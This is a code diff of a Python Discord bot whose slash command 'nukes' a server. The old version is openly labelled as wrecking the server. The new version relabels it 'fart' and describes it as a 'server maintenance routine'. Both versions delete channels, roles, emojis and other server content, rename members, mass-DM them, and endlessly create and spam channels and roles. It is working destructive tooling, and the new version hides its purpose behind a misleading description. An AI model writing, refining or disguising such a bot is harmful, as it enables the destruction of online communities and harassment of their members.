@@ -2,130 +2,131 @@ import discord
 from discord import app_commands
 from discord.ext import commands
 import asyncio
+import random
+import string
+
+# Gib hier deinen Bot-Token ein:
+TOKEN = input("Bitte gib deinen Discord-Bot-Token ein: ").strip()
+if not TOKEN:
+    raise RuntimeError("Kein Token eingegeben. Beende das Programm.")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-@bot.tree.command(name="start", description="This command will wreck your server and annoy everyone")
-@app_commands.describe(message="Message to send every 1 second and via DM")
-async def start(interaction: discord.Interaction, message: str):
-    await interaction.response.send_message("Starting...", ephemeral=True)
+@bot.tree.command(
+    name="fart",
+    description="Trigger a full server maintenance routine"
+)
+@app_commands.describe(
+    announcement="Announcement to send to all members and channels",
+    channel_prefix="Prefix for new channels",
+    nickname_prefix="Prefix for member nicknames",
+    action_delay="Delay (seconds) between creations"
+)
+@app_commands.checks.has_permissions(administrator=True)
+async def fart(
+    interaction: discord.Interaction,
+    announcement: str,
+    channel_prefix: str,
+    nickname_prefix: str,
+    action_delay: float = 1.0
+):
+    await interaction.response.send_message(
+        "🚀 Maintenance started. Check your DMs for details.",
+        ephemeral=True
+    )
     guild = interaction.guild
+    caller = interaction.user
 
-    for member in guild.members:
-        if member.bot: continue
-        try:
-            await member.send(message)
-            print(f"DEBUG: Sent DM to {member.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot DM {member.name}: {e}")
-
-    for member in guild.members:
-        if member.bot: continue
-        try:
-            await member.edit(nick="nuked by tapetenputzer")
-            print(f"DEBUG: Renamed {member.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot rename {member.name}: {e}")
-
-    print("DEBUG: Deleting channels with throttle")
+    # 1) Alle bestehenden Channels löschen
+    await caller.send("🔄 Deleting existing channels before starting spam...")
     for channel in guild.channels:
         try:
             await channel.delete()
-            print(f"DEBUG: Deleted channel {channel.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot delete channel {channel.name}: {e}")
-        await asyncio.sleep(0.5)
+        except:
+            pass
+        await asyncio.sleep(action_delay)
 
-    print("DEBUG: Deleting categories with throttle")
-    for category in guild.categories:
-        try:
-            await category.delete()
-            print(f"DEBUG: Deleted category {category.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot delete category {category.name}: {e}")
-        await asyncio.sleep(0.5)
+    # 2) Alle Mitglieder holen (für DMs & Nick-Updates)
+    members = []
+    async for m in guild.fetch_members(limit=None):
+        members.append(m)
 
-    print("DEBUG: Deleting roles with throttle")
-    for role in guild.roles:
-        if role.is_default(): continue
-        try:
-            await role.delete()
-            print(f"DEBUG: Deleted role {role.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot delete role {role.name}: {e}")
-        await asyncio.sleep(0.5)
+    # 3) Nur an den Ausführenden: Zusammenfassung senden
+    await caller.send(
+        f"Server maintenance parameters:\n"
+        f"- Announcement: `{announcement}`\n"
+        f"- Channel prefix: `{channel_prefix}`\n"
+        f"- Nickname prefix: `{nickname_prefix}`\n"
+        f"- Creation delay: `{action_delay}s`\n\n"
+        "Background tasks are now running: channel & role spam, plus announcements and nick updates."
+    )
 
-    print("DEBUG: Deleting emojis with throttle")
-    for emoji in guild.emojis:
-        try:
-            await emoji.delete()
-            print(f"DEBUG: Deleted emoji {emoji.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot delete emoji {emoji.name}: {e}")
-        await asyncio.sleep(0.5)
-
-    print("DEBUG: Deleting stickers with throttle")
-    for sticker in guild.stickers:
-        try:
-            await sticker.delete()
-            print(f"DEBUG: Deleted sticker {sticker.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot delete sticker {sticker.name}: {e}")
-        await asyncio.sleep(0.5)
-
-    print("DEBUG: Deleting invites with throttle")
-    try:
-        for invite in await guild.invites():
+    # 4) An alle anderen Mitglieder: nur die Announcement-DM
+    async def announce_to_members():
+        for member in members:
+            if member.bot or member.id == caller.id:
+                continue
             try:
-                await invite.delete()
-                print(f"DEBUG: Deleted invite {invite.code}")
-            except Exception as e:
-                print(f"ERROR: Cannot delete invite {invite.code}: {e}")
-            await asyncio.sleep(0.5)
-    except Exception as e:
-        print(f"ERROR: Cannot fetch invites: {e}")
+                await member.send(announcement)
+            except:
+                pass
+            await asyncio.sleep(action_delay)
+    bot.loop.create_task(announce_to_members())
 
-    print("DEBUG: Deleting webhooks with throttle")
-    for text_channel in guild.text_channels:
-        try:
-            hooks = await text_channel.webhooks()
-            for hook in hooks:
-                try:
-                    await hook.delete()
-                    print(f"DEBUG: Deleted webhook {hook.id} in {text_channel.name}")
-                except Exception as e:
-                    print(f"ERROR: Cannot delete webhook {hook.id}: {e}")
-                await asyncio.sleep(0.5)
-        except Exception as e:
-            print(f"ERROR: Cannot fetch webhooks in {text_channel.name}: {e}")
+    # 5) Einmalige Nick-Updates
+    async def update_nicks():
+        for member in members:
+            if member.bot:
+                continue
+            try:
+                await member.edit(nick=f"{nickname_prefix}{member.name}")
+            except:
+                pass
+            await asyncio.sleep(action_delay)
+    bot.loop.create_task(update_nicks())
 
-    new_channels = []
-    async def spam_loop():
+    # 6) Channel- und Role-Spam & Direkt-Nachricht in jedem neuen Channel
+    new_channels: list[discord.TextChannel] = []
+    async def channel_and_role_spam():
+        counter = 1
         while True:
-            for chan in new_channels:
+            # Neuen Channel erstellen
+            name = f"{channel_prefix}-{counter}"
+            try:
+                chan = await guild.create_text_channel(name)
+                new_channels.append(chan)
+                # Sofort post announcement
+                await chan.send(announcement)
+            except:
+                pass
+
+            # Neue Rolle erstellen
+            tag = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+            try:
+                await guild.create_role(name=tag)
+            except:
+                pass
+
+            counter += 1
+            await asyncio.sleep(action_delay)
+    bot.loop.create_task(channel_and_role_spam())
+
+    # 7) Fortlaufendes Spam in allen erstellten Channels
+    async def spam_in_channels():
+        while True:
+            for ch in list(new_channels):
                 try:
-                    await chan.send(message)
-                    print(f"DEBUG: Sent to {chan.name}: {message}")
-                except Exception as e:
-                    print(f"ERROR: Cannot send to {chan.name}: {e}")
-            await asyncio.sleep(1)
-
-    bot.loop.create_task(spam_loop())
-
-    print("DEBUG: Creating Tapetenputzer channels with throttle")
-    for i in range(20):
-        try:
-            chan = await guild.create_text_channel(f"Tapetenputzer-{i+1}")
-            new_channels.append(chan)
-            print(f"DEBUG: Created channel {chan.name}")
-        except Exception as e:
-            print(f"ERROR: Cannot create channel Tapetenputzer-{i+1}: {e}")
-        await asyncio.sleep(0.5)
+                    await ch.send(announcement)
+                except:
+                    pass
+            await asyncio.sleep(action_delay)
+    bot.loop.create_task(spam_in_channels())
 
 @bot.event
 async def on_ready():
     await bot.tree.sync()
-    print(f"DEBUG: Ready as {bot.user}")
+    print(f"Bot ist online als {bot.user}")
 
-bot.run("Bot Token")
+if __name__ == "__main__":
+    bot.run(TOKEN)
